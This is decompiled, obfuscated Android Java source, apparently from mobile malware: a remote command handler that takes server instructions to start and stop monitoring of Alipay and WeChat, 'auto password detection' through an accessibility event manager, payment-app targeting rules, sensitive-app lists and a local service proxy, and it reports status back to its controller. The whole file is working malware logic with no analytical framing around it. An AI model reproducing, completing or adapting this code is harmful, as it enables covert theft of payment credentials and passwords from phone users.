package com.storm.safe.rock.service.modules.command;

import android.content.SharedPreferences;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.cipher.C0340a6;
import com.storm.safe.rock.service.modules.cipher.C0341a7;
import io.socket.engineio.client.transports.PollingXHR;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Set;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.collections.EmptyList;
import kotlinx.coroutines.AbstractC0780a0;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0717jg;
import p000.AbstractC1262tj;
import p000.C0614i9;
import p000.C1221sg;
import p000.C1351vv;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.aa1;
import p000.j30;
import p000.kg1;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a2 */
/* loaded from: classes2.dex */
public final class C0345a2 implements InterfaceC0726jp {
    static {
        new C1221sg(null);
    }

    /* renamed from: a3 */
    public static C0341a7 m211877a3(uz0 uz0Var) {
        try {
            C0340a6 c0340a6 = C0341a7.f53380c1;
            dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
            return c0340a6.getInstance(dqtvuisjdVar, dqtvuisjdVar);
        } catch (Exception e) {
            t60.m214705c6("DetectionCmdHandler", "init failed", e);
            return null;
        }
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("ALIPAY_DETECTION_START", "ALIPAY_DETECTION_STOP", "WECHAT_DETECTION_START", "WECHAT_DETECTION_STOP", "AUTO_PASSWORD_DETECTION_START", "AUTO_PASSWORD_DETECTION_STOP", "SET_VIEW_CACHE_RULES", "ADD_VIEW_CACHE_RULE", "REMOVE_VIEW_CACHE_RULE", "CLEAR_VIEW_CACHE_RULES", "GET_VIEW_CACHE_STATUS", "SET_PAYMENT_STRATEGIES", "SET_SENSITIVE_APPS", "LOCAL_SERVICE_PROXY");
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Removed duplicated region for block: B:156:0x0390  */
    /* JADX WARN: Removed duplicated region for block: B:83:0x0179  */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) throws JSONException {
        C0341a7 c0340a6;
        C0341a7 c0341a7M211877a3;
        JSONArray jSONArray;
        String str2;
        String str3;
        int i;
        JSONArray jSONArray2;
        int i2;
        C0341a7 c0341a7M211877a32;
        int iHashCode = str.hashCode();
        j30 j30Var = j30.f57259a0;
        String str4 = "pkg";
        String str5 = "listenClasses";
        switch (iHashCode) {
            case -1670463758:
                if (str.equals("CLEAR_VIEW_CACHE_RULES")) {
                    C0341a7 c0340a62 = C0341a7.f53380c1.getInstance();
                    if (c0340a62 != null) {
                        c0340a62.f53385a2.clear();
                        c0340a62.m211872b2();
                    }
                    uz0Var.f60536a0.m211515l2("vc_updated", AbstractC0770a1.m213613f8(new Pair("packages", EmptyList.f57568a0)));
                    break;
                }
                break;
            case -1388866603:
                if (str.equals("WECHAT_DETECTION_STOP")) {
                    t60.m214714d6("DetectionCmdHandler", "停止微信检测");
                    uz0Var.f60536a0.m211456e5();
                    break;
                }
                break;
            case -1011055404:
                if (str.equals("AUTO_PASSWORD_DETECTION_START")) {
                    long jOptLong = jSONObject != null ? jSONObject.optLong("delayMs", 5000L) : 5000L;
                    t60.m214714d6("DetectionCmdHandler", "启动自动密码检测，延时: " + jOptLong + "ms");
                    dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
                    try {
                        t60.m214714d6("dqtvuisjd", "🔐 开启自动密码检测功能，延时: " + jOptLong + "ms");
                        C0614i9 c0614i9 = dqtvuisjdVar.f52414e5;
                        if (c0614i9 == null) {
                            t60.m214724f2("accessibilityEventManager");
                            throw null;
                        }
                        c0614i9.m213123b1(jOptLong);
                        C0323a8 c0323a8 = dqtvuisjdVar.f52415e6;
                        if (c0323a8 != null) {
                            c0323a8.m211656c2(jOptLong, true);
                            break;
                        }
                    } catch (Exception e) {
                        t60.m214705c6("dqtvuisjd", "❌ 开启自动密码检测失败", e);
                        break;
                    }
                }
                break;
            case -345334272:
                if (str.equals("GET_VIEW_CACHE_STATUS")) {
                    C0341a7 c0340a63 = C0341a7.f53380c1.getInstance();
                    uz0Var.f60536a0.m211515l2("vc_status", AbstractC0770a1.m213614f9(new Pair("packages", c0340a63 != null ? c0340a63.m211862a1() : EmptyList.f57568a0), new Pair("active", Boolean.valueOf(c0340a63 != null ? c0340a63.f53388a5.get() : false)), new Pair("hasRules", Boolean.valueOf(c0340a63 != null ? !c0340a63.f53385a2.isEmpty() : false))));
                    break;
                }
                break;
            case -105205041:
                if (str.equals("WECHAT_DETECTION_START")) {
                    long jOptLong2 = jSONObject != null ? jSONObject.optLong("delayMs", 0L) : 0L;
                    t60.m214714d6("DetectionCmdHandler", "启动微信检测，延时: " + jOptLong2 + "ms");
                    dqtvuisjd dqtvuisjdVar2 = uz0Var.f60536a0;
                    try {
                        t60.m214714d6("dqtvuisjd", "💬 开启微信检测功能，延时: " + jOptLong2 + "ms");
                        C0614i9 c0614i92 = dqtvuisjdVar2.f52414e5;
                        if (c0614i92 == null) {
                            t60.m214724f2("accessibilityEventManager");
                            throw null;
                        }
                        c0614i92.m213125b3(jOptLong2);
                        C0323a8 c0323a82 = dqtvuisjdVar2.f52415e6;
                        if (c0323a82 != null) {
                            c0323a82.m211668d4(true);
                            break;
                        }
                    } catch (Exception e2) {
                        t60.m214705c6("dqtvuisjd", "❌ 开启微信检测失败", e2);
                        break;
                    }
                }
                break;
            case -81260072:
                if (str.equals("REMOVE_VIEW_CACHE_RULE") && (c0340a6 = C0341a7.f53380c1.getInstance()) != null) {
                    String strOptString = jSONObject != null ? jSONObject.optString("packageName", "") : null;
                    String str6 = strOptString != null ? strOptString : "";
                    if (str6.length() != 0) {
                        c0340a6.m211866a5(str6);
                        uz0Var.f60536a0.m211515l2("vc_updated", AbstractC0770a1.m213613f8(new Pair("packages", c0340a6.m211862a1())));
                        break;
                    }
                }
                break;
            case 346884477:
                if (str.equals("SET_VIEW_CACHE_RULES") && (c0341a7M211877a3 = m211877a3(uz0Var)) != null) {
                    JSONArray jSONArrayOptJSONArray = jSONObject != null ? jSONObject.optJSONArray("packages") : null;
                    if (jSONArrayOptJSONArray != null && jSONArrayOptJSONArray.length() != 0) {
                        ArrayList arrayList = new ArrayList();
                        int length = jSONArrayOptJSONArray.length();
                        int i3 = 0;
                        while (i3 < length) {
                            JSONObject jSONObjectOptJSONObject = jSONArrayOptJSONArray.optJSONObject(i3);
                            if (jSONObjectOptJSONObject == null) {
                                jSONArray = jSONArrayOptJSONArray;
                                str2 = str4;
                                str3 = str5;
                                i = length;
                            } else {
                                String strOptString2 = jSONObjectOptJSONObject.optString("packageName", "");
                                t60.m214694b5(strOptString2, str4);
                                if (strOptString2.length() != 0) {
                                    jSONArray = jSONArrayOptJSONArray;
                                    String strOptString3 = jSONObjectOptJSONObject.optString("appName", "");
                                    JSONArray jSONArrayOptJSONArray2 = jSONObjectOptJSONObject.optJSONArray(str5);
                                    str2 = str4;
                                    ArrayList arrayList2 = new ArrayList();
                                    str3 = str5;
                                    if (jSONArrayOptJSONArray2 != null) {
                                        int length2 = jSONArrayOptJSONArray2.length();
                                        i = length;
                                        int i4 = 0;
                                        while (i4 < length2) {
                                            int i5 = length2;
                                            String strOptString4 = jSONArrayOptJSONArray2.optString(i4, "");
                                            t60.m214694b5(strOptString4, "c");
                                            if (strOptString4.length() > 0) {
                                                arrayList2.add(strOptString4);
                                            }
                                            i4++;
                                            length2 = i5;
                                        }
                                    } else {
                                        i = length;
                                    }
                                    t60.m214694b5(strOptString3, "appName");
                                    arrayList.add(new aa1(strOptString2, arrayList2, strOptString3));
                                }
                            }
                            i3++;
                            jSONArrayOptJSONArray = jSONArray;
                            length = i;
                            str4 = str2;
                            str5 = str3;
                        }
                        c0341a7M211877a3.m211869a9(arrayList);
                        ArrayList arrayList3 = new ArrayList(AbstractC0717jg.m213310g9(arrayList));
                        int size = arrayList.size();
                        int i6 = 0;
                        while (i6 < size) {
                            Object obj = arrayList.get(i6);
                            i6++;
                            arrayList3.add(((aa1) obj).f56a0);
                        }
                        uz0Var.f60536a0.m211515l2("vc_updated", AbstractC0770a1.m213613f8(new Pair("packages", arrayList3)));
                        break;
                    } else {
                        c0341a7M211877a3.f53385a2.clear();
                        c0341a7M211877a3.m211872b2();
                        uz0Var.f60536a0.m211515l2("vc_updated", AbstractC0770a1.m213613f8(new Pair("packages", EmptyList.f57568a0)));
                        break;
                    }
                }
                break;
            case 570302000:
                if (str.equals("LOCAL_SERVICE_PROXY")) {
                    String strOptString5 = jSONObject != null ? jSONObject.optString("path", "") : null;
                    String str7 = strOptString5 == null ? "" : strOptString5;
                    String strOptString6 = jSONObject != null ? jSONObject.optString("method", "GET") : null;
                    if (strOptString6 == null) {
                        strOptString6 = "GET";
                    }
                    if (jSONObject != null) {
                        jSONObject.optString("requestId", "");
                    }
                    if (str7.length() == 0) {
                        uz0Var.f60536a0.m211515l2("proxy_result", AbstractC0770a1.m213614f9(new Pair(PollingXHR.Request.EVENT_SUCCESS, Boolean.FALSE), new Pair("error", "missing path")));
                        break;
                    } else {
                        AbstractC0780a0.m213692a3(j30Var, AbstractC1262tj.f60234a1, new DetectionCommandHandler$handleLocalServiceProxy$1(str7, jSONObject, strOptString6, uz0Var, null), 2);
                        break;
                    }
                }
                break;
            case 652810296:
                if (str.equals("SET_SENSITIVE_APPS")) {
                    JSONArray jSONArrayOptJSONArray3 = jSONObject != null ? jSONObject.optJSONArray("apps") : null;
                    if (jSONArrayOptJSONArray3 == null) {
                        t60.m214726f4("DetectionCmdHandler", "SET_SENSITIVE_APPS: 无数据");
                        break;
                    } else {
                        AbstractC0003a2.m44c5("📋 收到敏感应用更新: ", jSONArrayOptJSONArray3.length(), " 个，转发到 local-service", "DetectionCmdHandler");
                        AbstractC0780a0.m213692a3(j30Var, AbstractC1262tj.f60234a1, new DetectionCommandHandler$handleSetSensitiveApps$1(jSONArrayOptJSONArray3, null), 2);
                        uz0Var.f60536a0.m211515l2("sensitive_apps_updated", AbstractC0770a1.m213613f8(new Pair("count", Integer.valueOf(jSONArrayOptJSONArray3.length()))));
                        break;
                    }
                }
                break;
            case 659662439:
                if (str.equals("SET_PAYMENT_STRATEGIES")) {
                    JSONArray jSONArrayOptJSONArray4 = jSONObject != null ? jSONObject.optJSONArray("strategies") : null;
                    if (jSONArrayOptJSONArray4 == null) {
                        t60.m214726f4("DetectionCmdHandler", "SET_PAYMENT_STRATEGIES: 无策略数据");
                        break;
                    } else {
                        ArrayList arrayList4 = new ArrayList();
                        int length3 = jSONArrayOptJSONArray4.length();
                        int i7 = 0;
                        while (i7 < length3) {
                            JSONObject jSONObjectOptJSONObject2 = jSONArrayOptJSONArray4.optJSONObject(i7);
                            if (jSONObjectOptJSONObject2 == null) {
                                jSONArray2 = jSONArrayOptJSONArray4;
                                i2 = length3;
                            } else {
                                String strOptString7 = jSONObjectOptJSONObject2.optString("packageName", "");
                                t60.m214694b5(strOptString7, "pkg");
                                if (strOptString7.length() != 0) {
                                    String strOptString8 = jSONObjectOptJSONObject2.optString("appName", "");
                                    JSONArray jSONArrayOptJSONArray5 = jSONObjectOptJSONObject2.optJSONArray("listenWinClasses");
                                    ArrayList arrayList5 = new ArrayList();
                                    jSONArray2 = jSONArrayOptJSONArray4;
                                    if (jSONArrayOptJSONArray5 != null) {
                                        int length4 = jSONArrayOptJSONArray5.length();
                                        i2 = length3;
                                        int i8 = 0;
                                        while (i8 < length4) {
                                            int i9 = length4;
                                            String strOptString9 = jSONArrayOptJSONArray5.optString(i8, "");
                                            int i10 = i8;
                                            t60.m214694b5(strOptString9, "cls");
                                            if (strOptString9.length() > 0) {
                                                arrayList5.add(strOptString9);
                                            }
                                            i8 = i10 + 1;
                                            length4 = i9;
                                        }
                                    } else {
                                        i2 = length3;
                                    }
                                    t60.m214694b5(strOptString8, "appName");
                                    arrayList4.add(new aa1(strOptString7, arrayList5, strOptString8));
                                }
                            }
                            i7++;
                            jSONArrayOptJSONArray4 = jSONArray2;
                            length3 = i2;
                        }
                        int i11 = 0;
                        SharedPreferences sharedPreferences = uz0Var.f60536a0.getSharedPreferences("payment_strategies", 0);
                        JSONArray jSONArray3 = new JSONArray();
                        int size2 = arrayList4.size();
                        int i12 = 0;
                        while (i12 < size2) {
                            Object obj2 = arrayList4.get(i12);
                            i12++;
                            aa1 aa1Var = (aa1) obj2;
                            JSONObject jSONObject2 = new JSONObject();
                            jSONObject2.put("packageName", aa1Var.f56a0);
                            jSONObject2.put("appName", aa1Var.f58a2);
                            jSONObject2.put("listenWinClasses", new JSONArray((Collection<?>) aa1Var.f57a1));
                            jSONArray3.put(jSONObject2);
                        }
                        sharedPreferences.edit().putString("strategies", jSONArray3.toString()).apply();
                        C0341a7 c0341a7M211877a33 = m211877a3(uz0Var);
                        if (c0341a7M211877a33 != null) {
                            c0341a7M211877a33.m211869a9(arrayList4);
                        }
                        int size3 = arrayList4.size();
                        ArrayList arrayList6 = new ArrayList(AbstractC0717jg.m213310g9(arrayList4));
                        int size4 = arrayList4.size();
                        int i13 = 0;
                        while (i13 < size4) {
                            Object obj3 = arrayList4.get(i13);
                            i13++;
                            arrayList6.add(((aa1) obj3).f56a0);
                        }
                        t60.m214714d6("DetectionCmdHandler", "📋 收到支付策略更新: " + size3 + "条, 包名: " + arrayList6);
                        Pair pair = new Pair("count", Integer.valueOf(arrayList4.size()));
                        ArrayList arrayList7 = new ArrayList(AbstractC0717jg.m213310g9(arrayList4));
                        int size5 = arrayList4.size();
                        while (i11 < size5) {
                            Object obj4 = arrayList4.get(i11);
                            i11++;
                            arrayList7.add(((aa1) obj4).f56a0);
                        }
                        uz0Var.f60536a0.m211515l2("payment_strategies_updated", AbstractC0770a1.m213614f9(pair, new Pair("packages", arrayList7)));
                        break;
                    }
                }
                break;
            case 819644915:
                if (str.equals("ALIPAY_DETECTION_START")) {
                    long jOptLong3 = jSONObject != null ? jSONObject.optLong("delayMs", 0L) : 0L;
                    t60.m214714d6("DetectionCmdHandler", "启动支付宝检测，延时: " + jOptLong3 + "ms");
                    dqtvuisjd dqtvuisjdVar3 = uz0Var.f60536a0;
                    try {
                        t60.m214714d6("dqtvuisjd", "💰 开启支付宝检测功能，延时: " + jOptLong3 + "ms");
                        C0614i9 c0614i93 = dqtvuisjdVar3.f52414e5;
                        if (c0614i93 == null) {
                            t60.m214724f2("accessibilityEventManager");
                            throw null;
                        }
                        c0614i93.m213122b0(jOptLong3);
                        C0323a8 c0323a83 = dqtvuisjdVar3.f52415e6;
                        if (c0323a83 != null) {
                            c0323a83.m211655c1(true);
                            break;
                        }
                    } catch (Exception e3) {
                        t60.m214705c6("dqtvuisjd", "❌ 开启支付宝检测失败", e3);
                        break;
                    }
                }
                break;
            case 1214311728:
                if (str.equals("AUTO_PASSWORD_DETECTION_STOP")) {
                    t60.m214714d6("DetectionCmdHandler", "停止自动密码检测");
                    dqtvuisjd dqtvuisjdVar4 = uz0Var.f60536a0;
                    try {
                        t60.m214714d6("dqtvuisjd", "🔐 关闭自动密码检测功能");
                        C0614i9 c0614i94 = dqtvuisjdVar4.f52414e5;
                        if (c0614i94 == null) {
                            t60.m214724f2("accessibilityEventManager");
                            throw null;
                        }
                        c0614i94.m213120a8();
                        C0323a8 c0323a84 = dqtvuisjdVar4.f52415e6;
                        if (c0323a84 != null) {
                            c0323a84.m211656c2(0L, false);
                            break;
                        }
                    } catch (Exception e4) {
                        t60.m214705c6("dqtvuisjd", "❌ 关闭自动密码检测失败", e4);
                        break;
                    }
                }
                break;
            case 1273366577:
                if (str.equals("ALIPAY_DETECTION_STOP")) {
                    t60.m214714d6("DetectionCmdHandler", "停止支付宝检测");
                    uz0Var.f60536a0.m211455e4();
                    break;
                }
                break;
            case 1898809301:
                if (str.equals("ADD_VIEW_CACHE_RULE") && (c0341a7M211877a32 = m211877a3(uz0Var)) != null) {
                    String strOptString10 = jSONObject != null ? jSONObject.optString("packageName", "") : null;
                    if (strOptString10 == null) {
                        strOptString10 = "";
                    }
                    if (strOptString10.length() != 0) {
                        String strOptString11 = jSONObject != null ? jSONObject.optString("appName", "") : null;
                        if (strOptString11 == null) {
                            strOptString11 = "";
                        }
                        JSONArray jSONArrayOptJSONArray6 = jSONObject != null ? jSONObject.optJSONArray("listenClasses") : null;
                        ArrayList arrayList8 = new ArrayList();
                        if (jSONArrayOptJSONArray6 != null) {
                            int length5 = jSONArrayOptJSONArray6.length();
                            for (int i14 = 0; i14 < length5; i14++) {
                                String strOptString12 = jSONArrayOptJSONArray6.optString(i14, "");
                                t60.m214694b5(strOptString12, "c");
                                if (strOptString12.length() > 0) {
                                    arrayList8.add(strOptString12);
                                }
                            }
                        }
                        c0341a7M211877a32.m211861a0(strOptString10, arrayList8, strOptString11);
                        uz0Var.f60536a0.m211515l2("vc_updated", AbstractC0770a1.m213613f8(new Pair("packages", c0341a7M211877a32.m211862a1())));
                        break;
                    }
                }
                break;
        }
        return C1351vv.f60710b1;
    }
}
